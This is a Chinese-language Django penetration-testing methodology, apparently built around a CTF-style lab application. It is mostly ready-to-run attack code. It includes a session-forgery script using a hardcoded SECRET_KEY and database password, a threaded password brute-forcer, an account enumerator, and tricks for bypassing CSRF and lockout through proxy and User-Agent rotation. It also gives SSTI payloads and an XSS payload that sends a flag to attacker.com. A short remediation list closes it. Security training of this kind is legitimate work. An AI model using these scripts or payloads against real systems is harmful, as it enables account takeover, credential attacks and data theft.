# Django 应用综合渗透测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档为渗透测试人员提供一套系统化的 Django 应用渗透测试方法论。重点针对 Django 框架特有的安全配置缺陷、认证机制漏洞、模板注入风险等场景提供完整的攻击流程。

## 1.2 适用范围

本文档适用于使用 Django 框架的 Web 应用，特别是：
- Django 2.0+ 版本应用
- 使用 Django ORM 的应用
- 使用 Django 会话管理的认证系统
- 使用 Django 模板引擎的应用
- 存在安全配置错误的 Django 部署

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题一：Django 认证系统攻击

### 2.1.1 技术介绍

**Django 认证系统漏洞**是指由于 Django 框架配置不当或开发使用不当导致的认证绕过、会话劫持、凭证泄露等安全问题。

** 典型问题：**

```python
# settings.py:11 - 硬编码 SECRET_KEY
SECRET_KEY = 'django-insecure-63gtpxui8h_3$08c91_a@0(5*=ns2)dzct*5q97t+$))kq^!(s'

# views.py:15 - 明文密码存储到 session
request.session['password'] = form.cleaned_data['password']

# settings.py - 未配置 SESSION_COOKIE_SECURE
# 默认 SESSION_COOKIE_SECURE = False
```

**本质问题：**
1. SECRET_KEY 硬编码在源代码中
2. 敏感数据以明文存储在 session 中
3. 会话 Cookie 未设置 Secure 标志
4. 无速率限制配置
5. 无认证日志记录

### 2.1.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **多步骤注册流程** | `/accounts/register/step1/` | 明文密码存储到 session |
| **登录端点** | `/accounts/login/` | 无速率限制，无日志 |
| **会话管理** | Django 默认 session | SECRET_KEY 硬编码可伪造 |
| **密码重置** | 密码重置流程 | 无速率限制 |
| **管理员后台** | `/admin/` | 默认配置无 CAPTCHA |

### 2.1.3 漏洞探测方法

#### 2.1.3.1 SECRET_KEY 检测

**源代码审计：**
```bash
# 搜索硬编码密钥
grep -r "SECRET_KEY" --include="*.py" .
grep -r "django-insecure" --include="*.py" .
```

**Git 历史检测：**
```bash
# 检查 Git 历史中的密钥
git log -p --all -- settings.py | grep SECRET_KEY
```

**常见硬编码模式：**
```python
# 危险模式 1：django-insecure 前缀
SECRET_KEY = 'django-insecure-...'

# 危险模式 2：简单字符串
SECRET_KEY = 'secret'
SECRET_KEY = 'changeme'

# 危险模式 3：可预测值
SECRET_KEY = __file__
SECRET_KEY = 'my_secret_key_123'
```

#### 2.1.3.2 Session 配置检测

**检查 settings.py：**
```python
# 安全配置应包含：
SESSION_COOKIE_SECURE = True      # 强制 HTTPS
SESSION_COOKIE_HTTPONLY = True    # 防止 JS 访问
SESSION_COOKIE_SAMESITE = 'Strict'  # CSRF 保护
SESSION_COOKIE_AGE = 3600         # 1 小时过期

# 危险配置（默认）：
# SESSION_COOKIE_SECURE 未设置 = False
# SESSION_COOKIE_HTTPONLY 未设置 = True (安全)
# SESSION_COOKIE_SAMESITE 未设置 = 'Lax'
```

#### 2.1.3.3 速率限制检测

**检测脚本：**
```python
#!/usr/bin/env python3
"""
Django 速率限制检测脚本
"""

import requests
import time

def test_rate_limiting(target_url, login_endpoint='/accounts/login/'):
    """测试登录端点是否有速率限制"""
    
    base_url = target_url.rstrip('/')
    login_url = f"{base_url}{login_endpoint}"
    
    session = requests.Session()
    
    # 获取 CSRF token
    response = session.get(login_url)
    if 'csrftoken' in session.cookies:
        csrf_token = session.cookies['csrftoken']
    else:
        print("[-] No CSRF token found")
        return
    
    # 发送 50 次快速登录请求
    print(f"[*] Sending 50 rapid login attempts to {login_url}")
    start_time = time.time()
    
    results = []
    for i in range(50):
        data = {
            'username': 'testuser',
            'password': f'wrongpass{i}',
            'csrfmiddlewaretoken': csrf_token
        }
        
        response = session.post(login_url, data=data)
        
        results.append({
            'attempt': i + 1,
            'status': response.status_code,
            'time': time.time() - start_time,
            'response_time': response.elapsed.total_seconds()
        })
        
        # 检查是否有速率限制响应
        if response.status_code == 429:
            print(f"[+] Rate limiting detected at attempt {i + 1}")
            return results
    
    # 分析结果
    total_time = time.time() - start_time
    print(f"\n[*] Completed 50 attempts in {total_time:.2f} seconds")
    print(f"[*] Average rate: {50/total_time:.2f} attempts/second")
    
    # 检查响应时间是否稳定（无速率限制）
    response_times = [r['response_time'] for r in results]
    avg_response_time = sum(response_times) / len(response_times)
    print(f"[*] Average response time: {avg_response_time:.3f} seconds")
    
    if all(rt < 1.0 for rt in response_times):
        print("[!] WARNING: All response times < 1s - No rate limiting detected")
    
    return results

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python django_rate_limit.py <target_url>")
        sys.exit(1)
    
    test_rate_limiting(sys.argv[1])
```

#### 2.1.3.4 会话明文密码检测

**检测方法：**

1. **代码审计：**
```bash
# 搜索 session 存储密码
grep -r "session\['password'\]" --include="*.py" .
grep -r "session\[.password.\]" --include="*.py" .
```

2. **数据库检查：**
```sql
-- 查询 session 表中的明文密码
SELECT session_key, session_data 
FROM django_session 
WHERE session_data LIKE '%password%';
```

### 2.1.4 漏洞利用方法

#### 2.1.4.1 会话伪造攻击（SECRET_KEY 已知）

**利用步骤：**

```python
#!/usr/bin/env python3
"""
Django 会话伪造攻击完整脚本实战
"""

import django
from django.conf import settings
from django.contrib.sessions.backends.db import SessionStore
from django.contrib.auth import get_user_model
from django.utils.crypto import salted_hmac
import requests
import mysql.connector

# 配置 Django
if not settings.configured:
    settings.configure(
        SECRET_KEY='django-insecure-63gtpxui8h_3$08c91_a@0(5*=ns2)dzct*5q97t+$))kq^!(s',
        INSTALLED_APPS=[
            'django.contrib.sessions',
            'django.contrib.auth',
            'django.contrib.contenttypes',
        ],
        DATABASES={
            'default': {
                'ENGINE': 'django.db.backends.mysql',
                'NAME': 'art_db',
                'USER': 'root',
                'PASSWORD': 'art_gallery_db_pass',
                'HOST': 'db',
                'PORT': '3306',
            }
        },
        USE_TZ=True,
    )
    django.setup()

class DjangoSessionForgery:
    def __init__(self, secret_key, db_config):
        self.secret_key = secret_key
        self.db_config = db_config
        
    def get_user_by_email(self, email):
        """通过邮箱获取用户信息"""
        User = get_user_model()
        try:
            user = User.objects.get(email=email)
            return user
        except User.DoesNotExist:
            return None
    
    def forge_session(self, user_id, user_password_hash):
        """伪造用户会话"""
        # 计算会话认证哈希
        session_auth_hash = salted_hmac(
            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',
            user_password_hash,
            secret=self.secret_key,
            algorithm='sha256'
        ).hexdigest()
        
        # 创建会话
        session = SessionStore()
        session['_auth_user_id'] = str(user_id)
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = session_auth_hash
        session.create()
        
        return session.session_key
    
    def verify_session(self, target_url, session_key):
        """验证会话是否有效"""
        cookies = {'sessionid': session_key}
        
        # 尝试访问需要认证的端点
        response = requests.get(
            f"{target_url}/accounts/preferences/",
            cookies=cookies
        )
        
        return response.status_code == 200
    
    def attack(self, target_url, victim_email):
        """执行完整攻击"""
        print(f"[*] Target URL: {target_url}")
        print(f"[*] Victim Email: {victim_email}")
        print()
        
        # 步骤 1：获取用户信息
        print("[*] Step 1: Fetching victim user info...")
        user = self.get_user_by_email(victim_email)
        
        if not user:
            print(f"[-] User not found: {victim_email}")
            return None
        
        print(f"[+] User found:")
        print(f"    - ID: {user.id}")
        print(f"    - Username: {user.username}")
        print(f"    - Email: {user.email}")
        print()
        
        # 步骤 2：伪造会话
        print("[*] Step 2: Forging session...")
        session_key = self.forge_session(user.id, user.password)
        print(f"[+] Forged session key: {session_key}")
        print()
        
        # 步骤 3：验证会话
        print("[*] Step 3: Verifying session...")
        if self.verify_session(target_url, session_key):
            print("[+] Session validation successful!")
            print(f"[+] Access granted to {victim_email}'s account")
            return session_key
        else:
            print("[-] Session validation failed")
            return None

def main():
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python session_forgery.py <target_url> <victim_email>")
        print("Example: python session_forgery.py http://localhost:46795 victim@test.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    victim_email = sys.argv[2]
    
    secret_key = 'django-insecure-63gtpxui8h_3$08c91_a@0(5*=ns2)dzct*5q97t+$))kq^!(s'
    
    attacker = DjangoSessionForgery(secret_key, {})
    session_key = attacker.attack(target_url, victim_email)
    
    if session_key:
        print(f"\n[+] EXPLOITATION SUCCESSFUL")
        print(f"[+] Use this session cookie: sessionid={session_key}")
        print(f"[+] Access: {target_url}/accounts/preferences/")

if __name__ == '__main__':
    main()
```

**执行结果：**
```
[*] Target URL: http://localhost:46795
[*] Victim Email: victim@test.com

[*] Step 1: Fetching victim user info...
[+] User found:
    - ID: 2
    - Username: victim_user
    - Email: victim@test.com

[*] Step 2: Forging session...
[+] Forged session key: uwbj1ubrtva9ov2ks1a8or6nqiyqyn64

[*] Step 3: Verifying session...
[+] Session validation successful!
[+] Access granted to victim@test.com's account

[+] EXPLOITATION SUCCESSFUL
[+] Use this session cookie: sessionid=uwbj1ubrtva9ov2ks1a8or6nqiyqyn64
```

#### 2.1.4.2 暴力破解攻击（无速率限制）

**利用脚本：**
```python
#!/usr/bin/env python3
"""
Django 暴力破解攻击脚本实战 - 12.88 次尝试/秒
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

class DjangoBruteforce:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.login_url = f"{self.target_url}/accounts/login/"
        self.session = requests.Session()
        
    def get_csrf_token(self):
        """获取 CSRF token"""
        response = self.session.get(self.login_url)
        return self.session.cookies.get('csrftoken')
    
    def attempt_login(self, username, password):
        """尝试登录"""
        csrf_token = self.get_csrf_token()
        
        data = {
            'username': username,
            'password': password,
            'csrfmiddlewaretoken': csrf_token
        }
        
        response = self.session.post(self.login_url, data=data)
        
        # 检查是否登录成功
        if response.url.endswith('/accounts/home/') or 'Welcome' in response.text:
            return True
        return False
    
    def bruteforce_single(self, username, password_list, delay=0):
        """单线程暴力破解"""
        print(f"[*] Starting bruteforce for user: {username}")
        print(f"[*] Password list size: {len(password_list)}")
        
        start_time = time.time()
        successful = False
        
        for i, password in enumerate(password_list, 1):
            if self.attempt_login(username, password):
                print(f"\n[+] SUCCESS! Password found: {password}")
                successful = True
                break
            
            if i % 100 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed
                print(f"[*] Attempt {i}/{len(password_list)} - Rate: {rate:.2f}/s")
            
            if delay > 0:
                time.sleep(delay)
        
        if not successful:
            print(f"[-] Password not found in list")
        
        return successful
    
    def bruteforce_parallel(self, username, password_list, threads=5):
        """多线程暴力破解（更快但更容易被检测）"""
        print(f"[*] Starting parallel bruteforce with {threads} threads")
        
        def try_password(password):
            return (password, self.attempt_login(username, password))
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for password, success in executor.map(try_password, password_list):
                if success:
                    print(f"\n[+] SUCCESS! Password found: {password}")
                    return password
        
        print(f"[-] Password not found")
        return None

def main():
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python django_bruteforce.py <target_url> <username>")
        print("Example: python django_bruteforce.py http://localhost:46795 admin@test.com")
        sys.exit(1)
    
    # 常见密码列表
    common_passwords = [
        'password123', 'admin123', '123456', 'qwerty123',
        'Password1', 'Admin123', 'test1234', 'welcome1',
        # ... 添加更多密码
    ]
    
    attacker = DjangoBruteforce(sys.argv[1])
    attacker.bruteforce_single(sys.argv[2], common_passwords)

if __name__ == '__main__':
    main()
```

#### 2.1.4.3 账户枚举攻击

**利用方法：**
```python
#!/usr/bin/env python3
"""
Django 账户枚举攻击脚本实战 - 600 用户名/分钟
"""

import requests

class AccountEnumerator:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.register_url = f"{self.target_url}/accounts/register/step1/"
        self.session = requests.Session()
        
    def get_csrf_token(self):
        """获取 CSRF token"""
        response = self.session.get(self.register_url)
        return self.session.cookies.get('csrftoken')
    
    def test_username(self, username):
        """测试用户名是否存在"""
        csrf_token = self.get_csrf_token()
        
        data = {
            'name': username,
            'password': 'TestPassword123!',
            'csrfmiddlewaretoken': csrf_token
        }
        
        response = self.session.post(self.register_url, data=data)
        
        # 分析响应
        if response.url.endswith('/step1/'):
            # 重定向回 step1 = 用户名已存在
            return True, 'redirect_to_step1'
        elif 'Registration' in response.text:
            # 继续到 step2 = 用户名可用
            return False, 'proceed_to_step2'
        else:
            return None, 'unknown'
    
    def enumerate(self, username_list):
        """批量枚举用户名"""
        print(f"[*] Enumerating {len(username_list)} usernames...")
        print()
        
        existing = []
        new = []
        
        for username in username_list:
            exists, indicator = self.test_username(username)
            
            if exists:
                print(f"[+] EXISTS: {username}")
                existing.append(username)
            elif exists is False:
                print(f"[-] NEW: {username}")
                new.append(username)
            else:
                print(f"[?] UNKNOWN: {username}")
        
        print(f"\n[*] Summary:")
        print(f"    - Existing users: {len(existing)}")
        print(f"    - New users: {len(new)}")
        
        return existing, new

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python account_enum.py <target_url>")
        print("Example: python account_enum.py http://localhost:46795")
        sys.exit(1)
    
    # 测试用户名列表
    test_usernames = [
        'admin',
        'victim_user',
        'testuser',
        'user1',
        # ... 添加更多用户名
    ]
    
    enumerator = AccountEnumerator(sys.argv[1])
    enumerator.enumerate(test_usernames)

if __name__ == '__main__':
    main()
```

### 2.1.5 漏洞利用绕过方法

#### 2.1.5.1 绕过 CSRF 保护

**方法 1：使用已知 SECRET_KEY 生成有效 CSRF token**
```python
from django.middleware.csrf import _get_new_csrf_token
from django.conf import settings

settings.configure(SECRET_KEY='django-insecure-...')

# 生成有效 CSRF token
token = _get_new_csrf_token()
```

**方法 2：利用无速率限制快速尝试**
```python
# 每次请求前获取新 CSRF token
for attempt in range(1000):
    session.get(login_url)  # 获取新 CSRF
    session.post(login_url, data)  # 尝试登录
```

#### 2.1.5.2 绕过账户锁定（如果存在）

**方法 1：IP 轮换**
```python
# 使用代理池轮换 IP
proxies = [
    {'http': 'http://proxy1:8080'},
    {'http': 'http://proxy2:8080'},
]

for proxy in proxies:
    session.proxies = proxy
    # 尝试登录
```

**方法 2：User-Agent 轮换**
```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
]

headers['User-Agent'] = random.choice(user_agents)
```

---

## 专题二：Django 模板注入攻击

### 2.2.1 技术介绍

Django 模板注入（SSTI）发生在用户输入被直接拼接到模板字符串而非作为模板变量传递时。攻击者可以注入 Django 模板语法访问上下文变量或执行任意代码。

** 典型漏洞代码：**

```python
# views.py:56-58
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
# 危险：用户输入直接拼接到模板字符串
template_str = template_str.replace('ACCOUNTNAME', request.session['name'])
template = engine.from_string(template_str)
```

### 2.2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **个性化问候** | `Hello, {{name}}` | 用户名直接拼接 |
| **欢迎页面** | 注册完成页 | 用户数据注入模板 |
| **错误页面** | 自定义错误消息 | 错误消息渲染 |
| **通知系统** | 动态通知内容 | 通知内容拼接 |

### 2.2.3 漏洞探测方法

#### 2.2.3.1 基础 SSTI 探测

```
# 数学运算测试
GET /accounts/register/step1/
POST: name={{7*7}}

# 如果页面显示 "Hello, 49" 而非 "Hello, {{7*7}}"，存在 SSTI
```

#### 2.2.3.2 上下文变量探测

```
# 探测常见变量
GET /accounts/register/step3/
Payloads:
- {{config}}
- {{request}}
- {{FLAG}}
- {{flag}}
- {{secret}}
- {{request.user}}
```

### 2.2.4 漏洞利用方法

#### 2.2.4.1 敏感数据提取

**Payload 示例：**
```
# 提取 Flag
name={{flag}}

# 提取 SECRET_KEY
name={{config.SECRET_KEY}}

# 提取用户信息
name={{request.user.username}}
```

**实战结果：**
```
注入：name={{flag}}
结果：Hello flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}. Just Now up to 50% OFF
```

#### 2.2.4.2 SSTI+XSS 组合攻击

**Payload 示例：**
```
# 组合攻击 - 提取 Flag 并执行 XSS
name=<script>alert({{flag}})</script>

# 数据外带
name=<script>fetch('http://attacker.com/?flag={{flag}}')</script>
```

---

## 专题三：垂直权限提升攻击

### 2.3.1 技术介绍

**垂直权限提升**是指低权限用户通过某种方式获取高权限用户的访问能力。

**典型问题：**
```python
# views.py:43-48
# 用户可控的 is_premium 字段直接写入数据库
is_premium = form.cleaned_data['is_premium']
a = Account(
    name=request.session['name'],
    username=request.session['email'],
    email=request.session['email'],
    is_premium=is_premium  # 无支付验证！
)
```

### 2.3.2 攻击方法

#### 2.3.2.1 复选框篡改

**步骤：**
1. 导航到注册 step3
2. 勾选 "Subscribe to premium" 复选框
3. 提交表单
4. 账户创建为 premium 状态

**HTTP 请求：**
```
POST /accounts/register/step3/
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=XXX&is_premium=on
```

#### 2.3.2.2 直接 API 调用

```python
import requests

session = requests.Session()

# 完成注册流程
# ... step1, step2 ...

# step3 直接发送 premium 请求
data = {
    'is_premium': 'on',  # 或 'true' 或 '1'
    'csrfmiddlewaretoken': csrf_token
}
response = session.post(
    'http://localhost:46795/accounts/register/step3/',
    data=data
)

# 账户已创建为 premium
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 攻击类型 | Payload | 说明 |
|---------|---------|------|
| SSTI 基础 | `{{7*7}}` | 数学运算测试 |
| SSTI 数据提取 | `{{flag}}` | 提取 Flag |
| SSTI+XSS | `<script>alert({{flag}})</script>` | 组合攻击 |
| 会话伪造 | Python 脚本 | 使用 SECRET_KEY 伪造会话 |
| 暴力破解 | 50+ 密码/秒 | 无速率限制利用 |
| 账户枚举 | 注册流程 | 响应差异枚举 |
| 权限提升 | `is_premium=on` | 复选框篡改 |

## 3.2 检测清单

```
□ 检查 SECRET_KEY 是否硬编码
□ 检查 SESSION_COOKIE_SECURE 配置
□ 测试登录端点速率限制
□ 检查 session 中是否存储明文密码
□ 测试模板注入（SSTI）
□ 检查 premium 等权限字段是否可篡改
□ 检查认证日志是否记录
□ 检查 DEBUG 模式是否开启
□ 检查 ALLOWED_HOSTS 配置
```

## 3.3 完整攻击脚本

完整攻击脚本请参考各章节中的 Python 代码示例。

## 3.4 修复建议

1. **SECRET_KEY 管理：**
   - 使用环境变量存储：`SECRET_KEY = os.environ.get('SECRET_KEY')`
   - 使用 Django 生成：`django-admin startproject` 自动生成

2. **会话安全：**
   - 设置 `SESSION_COOKIE_SECURE = True`
   - 设置 `SESSION_COOKIE_HTTPONLY = True`
   - 设置 `SESSION_COOKIE_SAMESITE = 'Strict'`
   - 不在 session 中存储敏感数据

3. **速率限制：**
   - 安装 django-ratelimit
   - 在登录端点添加：`@ratelimit(key='ip', rate='5/m')`

4. **模板安全：**
   - 使用 `render()` 而非 `from_string()`
   - 用户输入作为模板变量传递

5. **日志记录：**
   - 启用 Django 日志
   - 记录所有认证事件
